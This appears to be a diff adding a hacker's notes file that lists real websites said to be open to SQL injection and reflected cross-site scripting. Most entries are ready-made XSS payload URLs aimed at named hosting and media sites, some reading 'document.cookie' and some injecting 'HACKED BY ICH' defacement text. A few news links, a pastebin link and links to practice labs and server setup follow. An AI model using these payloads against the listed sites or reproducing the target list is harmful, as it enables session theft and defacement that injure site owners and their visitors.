@@ -1,0 +1,43 @@
+------------------------------------------------------------------------------
+SQL Injection |
+-------------------
+http://www.minutemanhq.com/hq/article.php?sid=34
+
+http://www.minutemanhq.com/print.php?sid=34
+
+http://www.terfidinuoro.it/home.php?inc=...&pl=7
+
+------------------------------------------------------------------------------
+Reflected XSS |
+-------------------
+http://host104.hostmonster.com/"><SCRIPT>alert(document.cookie)</SCRIPT><SCRIPT>alert("Evolution of Revolution")</script><img src="http://i49.tinypic.com/1zq7cyp.jpg /" />
+
+http://vividhbharti.com/"><SCRIPT>alert(document.cookie)</SCRIPT><SCRIPT>alert("Evolution of Revolution")</script><img src="http://i49.tinypic.com/1zq7cyp.jpg /" />
+
+http://www.linkupmedia.com/%22%3E%3CSCRIPT%3Ealert(document.cookie)%3C/SCRIPT%3E%3CSCRIPT%3Ealert(%22Evolution%20of%20Revolution%22)%3C/script%3E%3Cimg%20src=%22http://i49.tinypic.com/1zq7cyp.jpg%20/%22%20/%3E#sthash.yQ13P1Cq.ZkXM3bO2.dpuf
+-------------------------------------------------------------------------------------------------------------------------------------------------
+http://www.cluster2.hostgator.co.in/%22%3E%3Cscript%3Ealert(%22HACKED%20BY%20ICH%20%22)%3C/script%3E
+
+http://hostgator.co.in/%22%3E%3Cscript%3Ealert(document.cookie)%3C/script
+
+http://www.hostgator.co.in/%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+http://infragadget.hostgator.co.in/%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+http://www.ehackingnews.com/2013/01/millions-of-indian-sites-vulnerable-to-xss.html
+http://www.ehackingnews.com/2013/01/reflected-xss-hostmonster.html
+http://www.cyber-n.com/2013/01/critical-xss-vulnerability-in.html#sthash.yQ13P1Cq.dpbs
+http://www.cyber-n.com/2013/01/critical-xss-vulnerability-in-hostgator.html#sthash.3rUYxTC4.dpbs
+http://www.trademail.in/
+
+http://pastebin.com/kHH4nSCL
+
+
+--------------------------------------------------------------------------------------------------------------------------
+server
+http://www.dotnetfunda.com/articles/article1247-how-to-host-aspnet-application-on-the-web-server-iis.aspx
+
+-------------------------------------------------------------------------------------------------------------------------------
+10 vulnerable web applications you can play with
+http://pentestlab.org/10-vulnerable-web-applications-you-can-play-with/
